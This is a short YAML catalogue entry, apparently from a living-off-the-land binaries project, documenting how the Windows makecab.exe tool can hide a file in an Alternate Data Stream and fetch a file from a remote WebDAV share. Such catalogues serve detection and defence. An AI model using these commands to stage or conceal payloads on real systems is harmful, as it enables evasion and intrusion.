---
name: makecab.exe
description: Used in Windows to generate cabinet files
functions:
  ads:
    - description: Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.
      code: makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab
    - description: Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.
      code: makecab \\webdavserver\webdav\file.exe C:\Folder\file.txt:file.cab
  download:
    - description: Download and compresses the target file and stores it in the target file.
      code: makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab
resources: 
    - resource: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
fullpath: 
    - path: c:\windows\system32\makecab.exe
    - path: c:\windows\sysWOW64\makecab.exe
notes: Thanks to Oddvar Moe - @oddvarmoe
---